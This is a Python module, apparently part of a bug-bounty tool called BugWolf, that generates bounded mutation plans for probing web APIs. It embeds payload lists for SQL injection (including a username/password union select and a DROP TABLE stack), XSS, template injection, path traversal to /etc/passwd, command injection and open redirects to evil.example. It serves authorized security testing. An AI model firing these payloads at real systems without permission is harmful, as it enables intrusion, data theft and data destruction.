#!/usr/bin/env python3
"""Structure-aware mutation generator for BugWolf's Web/API discovery core.

Turns a :mod:`tools.surface_model.SurfaceModel` into bounded, deterministic
*mutation plans*. A mutation is a single-variable change (or a single state
or sibling experiment) — it is never executed here. Execution is the
discovery scheduler's job, and only through the authorization controller.

The mutator is deliberately differential-first: every mutation changes
exactly one variable so an observation can always be attributed.

Usage:
  python3 tools/mutator.py --target T --recon-dir recon/T --output recon/T/discovery/mutations.jsonl --json
"""

from __future__ import annotations

import hashlib
import urllib.parse
from dataclasses import asdict, dataclass, field
from enum import Enum
from typing import Any, Dict, Iterable, List, Optional

try:
    from tools.surface_model import Parameter, SurfaceModel
except ImportError:  # direct script execution
    from surface_model import Parameter, SurfaceModel

SCHEMA_VERSION = "bugwolf-mutation-v1"


class RiskClass(str, Enum):
    READ = "read"
    ACTIVE = "active"
    STATE_CHANGE = "state_change"
    DESTRUCTIVE = "destructive"


@dataclass
class Mutation:
    mutation_id: str
    operation_id: str
    method: str
    path: str
    kind: str                     # boundary | required_tamper | mass_assignment |
                                  # pollution | injection | blind_sqli | state |
                                  # sibling_differential | header_trust
    variable: str = ""            # parameter name (dotted for body); "" for state/sibling
    original: Any = None
    mutated: Any = None
    bug_class: str = "input_validation"
    risk: RiskClass | str = RiskClass.READ
    notes: str = ""
    sibling_id: str = ""          # paired operation for sibling differentials

    def __post_init__(self) -> None:
        if not isinstance(self.risk, RiskClass):
            self.risk = RiskClass(self.risk)

    def key(self) -> str:
        """Coverage key: operation × variable × kind (value-independent)."""
        return f"{self.operation_id}|{self.variable}|{self.kind}"

    def to_dict(self) -> Dict[str, Any]:
        data = asdict(self)
        data["risk"] = self.risk.value
        data["schema"] = SCHEMA_VERSION
        return data

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "Mutation":
        raw = dict(data)
        raw.pop("schema", None)
        return cls(**raw)


# ---------------------------------------------------------------------------
# Value generation (bounded + deterministic)
# ---------------------------------------------------------------------------

SINK_PARAMS = {
    "id", "ids", "uid", "user_id", "account_id", "company_id", "organization_id",
    "org_id", "fund_id", "order_id", "product_id", "page", "user", "file", "name",
    "q", "query", "search", "search_query", "keyword", "redirect", "next",
    "return_url", "url", "path", "cat", "category", "product", "order", "sort",
    "filter", "limit", "offset", "tab", "view", "lang", "ip", "host", "callback",
    "token", "state", "role", "status", "email", "phone",
}

# Pagination/sorting parameters treated as time-based blind-SQLi surfaces
# (e.g. ``/sitemap.xml?offset=1``). These route to the dedicated blind_sqli
# plan kind, independent of the string/any type check used for classic sinks.
_PAGINATION_PARAMS = {"offset", "page", "limit", "sort", "order", "filter"}

# Injection-class probe values. These are PLAN strings only — the mutator never
# sends them. Execution requires the authorization controller + confirmation.
#
# The SQLi pool covers the five classes Halfond et al. [26] use to classify
# payloads (see ART4SQLi §IV-F5): boolean-based blind, error-based, union
# query, stacked queries, and time-based blind. Keeping the pool
# grammar-diverse is what gives the ART4SQLi token-space selector something
# to spread over (the paper's payload collection is built the same way, from
# fuzzdb-style payloads plus tamper mutations, deduplicated).
INJECTION_VALUES = {
    "sqli": [
        "'",
        "1 OR 1=1--",
        "1' AND '1'='1",
        "1' AND SLEEP(0)--",
        # boolean-based blind
        "1 AND 1=1--",
        "1' AND '1'='1' -- ",
        "1 AND SUBSTR((SELECT version()),1,1)='5'--",
        # union query
        "1 UNION SELECT NULL--",
        "1' UNION SELECT username,password FROM users--",
        "1 UNION ALL SELECT 1,2,3--",
        # error-based
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))#",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x "
        "FROM information_schema.tables GROUP BY x)a)#",
        # stacked queries
        "1;DROP TABLE IF EXISTS x--",
        "1';INSERT INTO log VALUES('x')--",
    ],
    # Time-based blind detection *plans* (DB-agnostic). These are never fired
    # by the mutator; execution still requires the gated controller.
    "blind_sqli": [
        "1 AND SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "1;SELECT IF((8303>8302),SLEEP(5),0)#",
        "1 AND PG_SLEEP(5)--",
        "1 WAITFOR DELAY '0:0:5'--",
        # extra time-based variants (grammar-diverse: comment/terminator
        # forms, IF/BENCHMARK/SUBQUERY encodings, stacked pg_sleep)
        "1 AND SLEEP(5)#",
        "1' OR SLEEP(5) AND '1'='1",
        "1' AND (SELECT SLEEP(5))--",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AND BENCHMARK(5000000,SHA1('x'))--",
        "1';SELECT pg_sleep(5);--",
    ],
    "xss": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"],
    "ssti": ["{{7*7}}", "${7*7}"],
    "path_traversal": ["../../../../etc/passwd", "....//....//etc/passwd"],
    "cmd": ["127.0.0.1;id", "127.0.0.1|id"],
    "redirect": ["https://evil.example", "//evil.example"],
}


def _boundary_values(param: Parameter) -> List[Any]:
    """Type-aware boundary values for a single parameter."""
    t = param.type
    if t == "integer":
        return [0, -1, 1, 2 ** 31 - 1, -(2 ** 31), 2 ** 31, 2 ** 63 - 1]
    if t == "number":
        return [0, -1, 1, 1e308, -1e308, 0.5]
    if t == "boolean":
        return [True, False, 1, 0, "true"]
    if t == "array":
        return [[], [None], [param.default if param.default is not None else ""]]
    if t == "object":
        return [{}, {"unexpected": "value"}]
    # string (and any)
    values: List[Any] = ["", " ", "a" * 2000, "\u0000", "..", "../", "true", "null", "0"]
    if param.format == "email":
        values += ["x", "a@b", "a@b.c", "a b@c"]
    elif param.format in ("uuid",):
        values += ["x", "0", "not-a-uuid"]
    elif param.format in ("date", "date-time"):
        values += ["x", "0", "9999-99-99"]
    elif param.format in ("uri", "url"):
        values += ["javascript:alert(1)", "not-a-uri"]
    elif param.enum:
        values += ["__invalid__"]
    return values


def _enum_values(param: Parameter) -> List[Any]:
    return list(param.enum) + ["__invalid__"]


def _is_sink(name: str) -> bool:
    base = name.split(".")[-1].lower()
    return base in SINK_PARAMS


def _risk_for(method: str) -> RiskClass:
    m = method.upper()
    if m in {"GET", "HEAD", "OPTIONS"}:
        return RiskClass.READ
    if m in {"PUT", "PATCH"}:
        return RiskClass.STATE_CHANGE
    if m == "DELETE":
        return RiskClass.DESTRUCTIVE
    return RiskClass.ACTIVE


class Mutator:
    """Generate bounded structure-aware mutation plans from a SurfaceModel."""

    def __init__(self, *, max_per_param: int = 8, max_per_op: int = 160,
                 max_total: int = 4000):
        self.max_per_param = max(1, max_per_param)
        self.max_per_op = max(1, max_per_op)
        self.max_total = max(1, max_total)

    def _add(self, out: List[Mutation], operation_id: str, method: str, path: str,
             kind: str, variable: str, original: Any, mutated: Any,
             bug_class: str, risk: RiskClass, notes: str = "",
             sibling_id: str = "") -> bool:
        if len(out) >= self.max_total:
            return False
        raw = "|".join([operation_id, kind, variable, repr(mutated), sibling_id])
        mutation_id = hashlib.sha256(raw.encode()).hexdigest()[:16]
        out.append(Mutation(
            mutation_id=mutation_id, operation_id=operation_id, method=method,
            path=path, kind=kind, variable=variable, original=original,
            mutated=mutated, bug_class=bug_class, risk=risk, notes=notes,
            sibling_id=sibling_id,
        ))
        return True

    def _boundary(self, out: List[Mutation], op: Any, param: Parameter,
                  risk: RiskClass) -> None:
        values = (_enum_values(param) if param.enum else _boundary_values(param))
        for value in values[:self.max_per_param]:
            self._add(out, op.operation_id, op.method, op.path, "boundary",
                      param.name, param.default, value,
                      "enum_validation" if param.enum else
                      ("type_confusion" if param.type in ("integer", "number", "boolean")
                       else "input_validation"),
                      risk, f"boundary/type probe on {param.name}")

    def _required_tamper(self, out: List[Mutation], op: Any, param: Parameter,
                         risk: RiskClass) -> None:
        if param.location.value != "body":
            return
        self._add(out, op.operation_id, op.method, op.path, "required_tamper",
                  param.name, param.default, "__omit__", "type_confusion", risk,
                  f"omit required field {param.name}")
        self._add(out, op.operation_id, op.method, op.path, "required_tamper",
                  param.name, param.default, "__null__", "type_confusion", risk,
                  f"send null for {param.name}")

    def _mass_assignment(self, out: List[Mutation], op: Any, risk: RiskClass) -> None:
        if op.method.upper() not in {"POST", "PUT", "PATCH"}:
            return
        for extra in ("role", "is_admin", "admin", "user_id", "id", "paid",
                      "balance", "is_verified", "organization_id"):
            self._add(out, op.operation_id, op.method, op.path, "mass_assignment",
                      extra, None, True, "mass_assignment", risk,
                      f"inject extra body field {extra}")

    def _pollution(self, out: List[Mutation], op: Any, param: Parameter,
                   risk: RiskClass) -> None:
        if param.location.value != "query":
            return
        self._add(out, op.operation_id, op.method, op.path, "pollution",
                  param.name, None, "__duplicate__", "parameter_pollution", risk,
                  f"duplicate query parameter {param.name}")

    def _injection(self, out: List[Mutation], op: Any, param: Parameter,
                   risk: RiskClass) -> None:
        if not _is_sink(param.name):
            return
        name = param.name.split(".")[-1].lower()
        # Pagination/sorting parameters are a classic time-based blind-SQLi
        # surface; plan the DB-agnostic sleep probes regardless of scalar type.
        if name in _PAGINATION_PARAMS:
            for value in INJECTION_VALUES["blind_sqli"]:
                self._add(out, op.operation_id, op.method, op.path, "blind_sqli",
                          param.name, None, value, "sql_injection", risk,
                          f"time-based blind SQLi detection plan on {param.name}")
            return
        if param.type not in ("string", "any"):
            return
        # Which injection classes make sense for the parameter's role.
        if name in {"redirect", "next", "return_url", "url", "callback", "path"}:
            classes = ["redirect"]
        elif name in {"ip", "host"}:
            classes = ["cmd"]
        elif name in {"file", "path"}:
            classes = ["path_traversal"]
        elif name in {"q", "name", "search", "query", "search_query", "keyword"}:
            classes = ["sqli", "xss", "ssti"]
        else:
            classes = ["sqli"]
        for cls in classes:
            # Bounded per class so classic sink params stay within the per-op
            # budget; the full pool still feeds the ART4SQLi token space across
            # all sink parameters of the surface.
            for value in INJECTION_VALUES[cls][:8]:
                self._add(out, op.operation_id, op.method, op.path, "injection",
                          param.name, None, value,
                          {"sqli": "sql_injection", "xss": "xss",
                           "ssti": "template_injection",
                           "path_traversal": "path_traversal",
                           "cmd": "command_injection",
                           "redirect": "open_redirect"}[cls],
                          risk, f"{cls} probe on {param.name}")

    def _state_mutations(self, out: List[Mutation], model: SurfaceModel) -> None:
        by_resource: Dict[str, List] = {}
        for t in model.transitions:
            by_resource.setdefault(t.resource, []).append(t)
        for resource, steps in by_resource.items():
            steps = sorted(steps, key=lambda s: s.order)
            for i, step in enumerate(steps):
                risk = _risk_for(step.method)
                if i > 0:
                    self._add(out, step.operation_id, step.method, step.path,
                              "state", "", None, None, "business_logic", risk,
                              f"skip predecessors; call '{step.step}' first "
                              f"(resource {resource})")
                self._add(out, step.operation_id, step.method, step.path,
                          "state", "", None, None, "business_logic", risk,
                          f"repeat '{step.step}' twice (idempotency, resource "
                          f"{resource})")
                if i > 0:
                    prev = steps[i - 1]
                    self._add(out, step.operation_id, step.method, step.path,
                              "state", "", None, None, "business_logic", risk,
                              f"reorder: '{step.step}' before '{prev.step}' "
                              f"(resource {resource})")

    def _header_trust(self, out: List[Mutation], model: SurfaceModel) -> None:
        """Emit bounded proxy/forwarded-header trust probes per origin host.

        Header trust is a per-origin property (the proxy in front of the app),
        so probes are keyed to hosts extracted from the model's base URLs
        rather than to individual operations. Values are trust *hypotheses*
        (forged addresses/URIs); nothing is sent from the mutator.
        """
        try:
            from tools.header_trust import HEADER_TAXONOMY, _BUG_CLASS_LABEL
        except ImportError:  # direct script execution
            from header_trust import HEADER_TAXONOMY, _BUG_CLASS_LABEL

        hosts: List[str] = []
        for base in model.base_urls:
            try:
                netloc = urllib.parse.urlparse(base).netloc or base
            except ValueError:
                netloc = base
            if netloc and netloc not in hosts:
                hosts.append(netloc)
        if not hosts:
            hosts = [model.target]

        # One representative mutation per unique header name per host: the
        # scheduler's coverage is value-independent (key = header name), so the
        # full value matrix lives in header_trust.build_probes, not here.
        for host in hosts[:8]:
            seen_headers: set = set()
            for spec in HEADER_TAXONOMY:
                if spec.name in seen_headers:
                    continue
                seen_headers.add(spec.name)
                if len(out) >= self.max_total:
                    return
                self._add(
                    out, f"header:{host}", "GET", f"//{host}", "header_trust",
                    spec.name, None, spec.value,
                    _BUG_CLASS_LABEL.get(spec.bug_class, "header_trust"),
                    RiskClass.READ,
                    f"{spec.category}: {spec.note}",
                )

    def _sibling_differentials(self, out: List[Mutation], model: SurfaceModel) -> None:
        for group in model.siblings:
            if len(group.operation_ids) < 2:
                continue
            reference = group.operation_ids[0]
            ref_op = model.operation_by_id(reference)
            if ref_op is None:
                continue
            for member in group.operation_ids[1:]:
                op = model.operation_by_id(member)
                if op is None:
                    continue
                self._add(out, member, op.method, op.path, "sibling_differential",
                          "", None, None, "sibling_divergence", _risk_for(op.method),
                          f"replay identical input against sibling {reference} "
                          f"and diff the response", sibling_id=reference)

    def mutations(self, model: SurfaceModel) -> List[Mutation]:
        out: List[Mutation] = []
        for op in model.operations:
            before = len(out)
            risk = _risk_for(op.method)
            for param in op.params:
                if len(out) - before >= self.max_per_op:
                    break
                self._boundary(out, op, param, risk)
                self._pollution(out, op, param, risk)
                self._injection(out, op, param, risk)
                if param.required:
                    self._required_tamper(out, op, param, risk)
            self._mass_assignment(out, op, risk)
        self._state_mutations(out, model)
        self._sibling_differentials(out, model)
        self._header_trust(out, model)
        return out[: self.max_total]


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    import argparse
    import json
    import sys
    from pathlib import Path

    try:
        from tools.surface_model import load_surface
    except ImportError:
        from surface_model import load_surface

    parser = argparse.ArgumentParser(
        description="Generate structure-aware mutation plans from a surface model")
    parser.add_argument("--target", required=True)
    parser.add_argument("--openapi", help="OpenAPI/Swagger JSON file")
    parser.add_argument("--graphql", help="GraphQL introspection JSON file")
    parser.add_argument("--urls-file", help="Recon URL list")
    parser.add_argument("--surface-file", help="Previously saved surface model")
    parser.add_argument("--recon-dir", help="Auto-discover schemas from a recon output directory")
    parser.add_argument("--base-url", default="")
    parser.add_argument("--output", help="Write mutations JSONL to this path")
    parser.add_argument("--json", action="store_true", help="Print JSON to stdout")
    args = parser.parse_args()

    try:
        if args.recon_dir:
            from tools.schema_extractor import build_surface
            model = build_surface(args.target, args.recon_dir)
        else:
            model = load_surface(target=args.target, openapi_file=args.openapi,
                                 graphql_file=args.graphql, urls_file=args.urls_file,
                                 surface_file=args.surface_file, base_url=args.base_url)
    except (ValueError, OSError, json.JSONDecodeError) as exc:
        print(f"[!] {exc}", file=sys.stderr)
        raise SystemExit(2)

    mutations = Mutator().mutations(model)
    if args.output:
        with open(args.output, "w") as stream:
            for m in mutations:
                stream.write(json.dumps(m.to_dict(), default=str) + "\n")

    if args.json:
        print(json.dumps([m.to_dict() for m in mutations], indent=2, default=str))
    else:
        print(f"[*] Mutations generated: {len(mutations)}")
        by_kind: Dict[str, int] = {}
        for m in mutations:
            by_kind[m.kind] = by_kind.get(m.kind, 0) + 1
        for kind, count in sorted(by_kind.items()):
            print(f"    {kind}: {count}")
        for m in mutations[:20]:
            print(f"    [{m.risk.value}] {m.kind} {m.method} {m.path} "
                  f"{m.variable or ''}")


if __name__ == "__main__":
    main()
